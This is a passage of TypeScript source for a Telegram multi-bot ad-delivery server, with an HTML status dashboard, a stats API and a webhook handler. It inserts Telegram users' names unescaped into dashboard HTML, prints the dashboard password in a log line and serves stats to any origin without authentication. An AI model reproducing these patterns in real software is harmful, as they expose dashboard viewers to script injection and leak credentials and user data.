                <div class="card-label">Fresh Uptime</div>
            </div>
            <div class="fresh-card info">
                <div class="card-value">${metrics.currentConnections}</div>
                <div class="card-label">Active Connections</div>
            </div>
            <div class="fresh-card warning">
                <div class="card-value">${FreshUtils.formatMemorySize(metrics.memoryUsage.heapUsed)}</div>
                <div class="card-label">Memory Usage</div>
            </div>
        </div>

        <!-- Single Content Stats -->
        <div class="fresh-section">
            <div class="section-header">📊 Single Content Statistics</div>
            <div class="section-content">
                <div class="fresh-grid">
                    <div class="fresh-card success">
                        <div class="card-value">${contentStats.stats.views.toLocaleString()}</div>
                        <div class="card-label">Content Views</div>
                    </div>
                    <div class="fresh-card info">
                        <div class="card-value">${contentStats.stats.clicks.toLocaleString()}</div>
                        <div class="card-label">Button Clicks</div>
                    </div>
                    <div class="fresh-card ${contentStats.active ? "success" : "error"}">
                        <div class="card-value">${contentStats.active ? "✅" : "❌"}</div>
                        <div class="card-label">Content Status</div>
                    </div>
                    <div class="fresh-card info">
                        <div class="card-value">${contentStats.id}</div>
                        <div class="card-label">Content ID</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Fresh Bot Status -->
        <div class="fresh-section">
            <div class="section-header">🤖 Fresh Bot Status</div>
            <div class="section-content">
                <div class="fresh-grid">
                    ${botStatus
                      .map(
                        (bot) => `
                        <div class="fresh-card">
                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem;">
                                <strong style="font-size: 1.3rem; font-weight: 900;">${bot.name}</strong>
                                <span style="color: ${bot.inCooldown ? "#f59e0b" : "#10b981"}; font-weight: 900; font-size: 1.1rem;">
                                    ${bot.inCooldown ? "⏸️ Cooldown" : "✅ Active"}
                                </span>
                            </div>
                            <div class="fresh-health">
                                <div class="health-fill ${bot.health >= 70 ? "health-excellent" : bot.health >= 40 ? "health-good" : "health-poor"}" 
                                     style="width: ${bot.health}%"></div>
                            </div>
                            <div style="margin-top: 1.5rem; font-size: 1rem; color: #4a5568; font-weight: 600;">
                                Health: ${bot.health}% | Last used: ${bot.lastUsed ? new Date(bot.lastUsed).toLocaleTimeString() : "Never"}
                            </div>
                        </div>
                    `,
                      )
                      .join("")}
                </div>
            </div>
        </div>

        <!-- Fresh Request Logs -->
        <div class="fresh-section">
            <div class="section-header">📊 Fresh Request Logs (Last 20)</div>
            <div class="section-content">
                <div style="overflow-x: auto;">
                    <table class="fresh-table">
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Bot Token</th>
                                <th>Status</th>
                                <th>Response Time</th>
                                <th>Client IP</th>
                                <th>Error Details</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${recentLogs
                              .map(
                                (log) => `
                                <tr>
                                    <td>${new Date(log.timestamp).toLocaleString()}</td>
                                    <td><code>${log.token.substring(0, 10)}...</code></td>
                                    <td class="status-${log.status}">${log.status.toUpperCase()}</td>
                                    <td>${log.responseTime.toFixed(2)}ms</td>
                                    <td><code>${log.ip || "unknown"}</code></td>
                                    <td>${log.error || "-"}</td>
                                </tr>
                            `,
                              )
                              .join("")}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Fresh User Activities -->
        <div class="fresh-section">
            <div class="section-header">💬 Fresh User Activities (${serverController.activityBuffer.length} in buffer)</div>
            <div class="section-content">
                <div style="overflow-x: auto;">
                    <table class="fresh-table">
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Bot</th>
                                <th>User</th>
                                <th>Chat Type</th>
                                <th>Activity Type</th>
                                <th>Response Time</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${serverController.activityBuffer
                              .slice(0, 15)
                              .map(
                                (activity) => `
                                <tr>
                                    <td>${new Date(activity.timestamp).toLocaleTimeString()}</td>
                                    <td>@${activity.botUsername}</td>
                                    <td>
                                        <div style="font-weight: 700;">${activity.userDetails.fullName}</div>
                                        <small style="color: #4a5568;">@${activity.userDetails.username} (${activity.userDetails.id})</small>
                                    </td>
                                    <td><span style="background: #e2e8f0; padding: 6px 12px; border-radius: 8px; font-size: 0.8rem; font-weight: 700;">${activity.chatDetails.type}</span></td>
                                    <td><span style="background: #dbeafe; padding: 6px 12px; border-radius: 8px; font-size: 0.8rem; font-weight: 700;">${activity.activityType}</span></td>
                                    <td>${activity.processingData.responseTime.toFixed(2)}ms</td>
                                </tr>
                            `,
                              )
                              .join("")}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <button class="fresh-refresh" onclick="window.location.reload()" title="Refresh Fresh Dashboard">
        🔄
    </button>

    <script>
        setTimeout(() => {
            window.location.reload();
        }, 30000);
        
        document.addEventListener('DOMContentLoaded', function() {
            const refreshBtn = document.querySelector('.fresh-refresh');
            refreshBtn.addEventListener('click', function() {
                this.innerHTML = '⏳';
                this.style.transform = 'rotate(360deg)';
            });
        });
    </script>
</body>
</html>`

  return new Response(html, {
    headers: { "Content-Type": "text/html" },
  })
}

// Fresh API Stats
function createFreshStatsAPI(): Response {
  const metrics = serverController.getServerMetrics()
  const botStatus = FreshLogBotManager.getBotStatus()
  const contentStats = FreshContentDelivery.getContentStats()

  return new Response(
    JSON.stringify({
      metrics,
      botStatus,
      contentStats,
      activityBufferSize: serverController.activityBuffer.length,
      timestamp: new Date().toISOString(),
      version: "fresh_v1.0",
    }),
    {
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      },
    },
  )
}

// Fresh Server
serve({
  port: process.env.PORT || 3000,

  async fetch(req: Request): Promise<Response> {
    const startTime = performance.now()
    const url = new URL(req.url)
    const method = req.method
    const pathname = url.pathname
    const userAgent = req.headers.get("user-agent") || "unknown"
    const clientIP = FreshUtils.getRequestIP(req)

    serverController.increaseConnections()

    try {
      if (FreshUtils.isRequestRateLimited(clientIP)) {
        return new Response("Rate limit exceeded", {
          status: 429,
          headers: { "Retry-After": "60" },
        })
      }

      if (method === "POST" && pathname.startsWith("/bot/")) {
        const botToken = pathname.split("/bot/")[1]

        if (!botToken || !botToken.includes(":")) {
          FreshRequestLogger.recordRequest({
            token: botToken || "invalid",
            status: "failed",
            responseTime: performance.now() - startTime,
            error: "Invalid bot token format",
            userAgent,
            ip: clientIP,
          })
          return new Response("Invalid bot token format", { status: 400 })
        }

        try {
          const update = (await req.json()) as IncomingUpdate

          await processFreshUpdate(update, botToken, userAgent, clientIP, startTime)

          FreshRequestLogger.recordRequest({
            token: botToken,
            status: "success",
            responseTime: performance.now() - startTime,
            userAgent,
            ip: clientIP,
          })

          return new Response("OK", { status: 200 })
        } catch (error: any) {
          FreshRequestLogger.recordRequest({
            token: botToken,
            status: "failed",
            responseTime: performance.now() - startTime,
            error: error.message,
            userAgent,
            ip: clientIP,
          })

          console.error("❌ Fresh webhook processing error:", error)
          return new Response("OK", { status: 200 })
        }
      }

      if (method === "GET" && pathname === "/") {
        return createFreshStatusPage()
      }

      if (method === "GET" && pathname === "/status") {
        return createFreshDashboard(url)
      }

      if (method === "GET" && pathname === "/api/stats") {
        return createFreshStatsAPI()
      }

      return new Response("Not Found", { status: 404 })
    } finally {
      serverController.decreaseConnections()
    }
  },
})

console.log(`🚀 FRESH Telegram Bot Server started on port ${process.env.PORT || 3000}`)
console.log(`📊 FRESH Dashboard available at: /status?pass=${SERVER_SETTINGS.DASHBOARD_PASSWORD}`)
console.log(`🔧 FRESH API endpoint available at: /api/stats`)
console.log(`✨ ONLY ONE CONTENT ITEM ACTIVE - NO OLD ADS POSSIBLE`)
